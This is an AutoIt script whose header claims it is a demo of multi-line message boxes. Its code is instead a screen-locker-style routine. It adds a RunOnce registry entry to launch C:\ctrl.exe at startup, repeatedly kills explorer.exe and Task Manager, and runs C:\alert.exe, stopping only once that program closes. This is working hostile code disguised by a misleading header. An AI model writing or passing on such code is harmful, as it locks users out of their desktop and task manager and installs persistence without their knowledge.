;
; AutoIt Version: 3.0
; Language:       English
; Platform:       Win9x/NT
; Author:         Jonathan Bennett (jon@hiddensoft.com)
;
; Script Function:
;   Demo of using multiple lines in a message box
;

; Use the @CRLF macro to do a newline in a MsgBox - it is similar to the \n in v2.64

$var = 0
$count = 0

RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", "Alerta", "REG_SZ", "C:\ctrl.exe")

While $var == 0
	
If ProcessExists("explorer.exe") Then ProcessClose("explorer.exe")
If ProcessExists("taskmgr.exe") Then ProcessClose("taskmgr.exe")
Sleep(100)

If $count == 0 Then
While $count == 0
Run("C:\alert.exe")	
ProcessWait("alert.exe")
If ProcessExists("alert.exe") Then $count = 1
WEnd
EndIf

$processo = ProcessExists("alert.exe") 

If $processo == 0 And $count == 1 Then 
	$var = 1
EndIf

WEnd

Exit(0)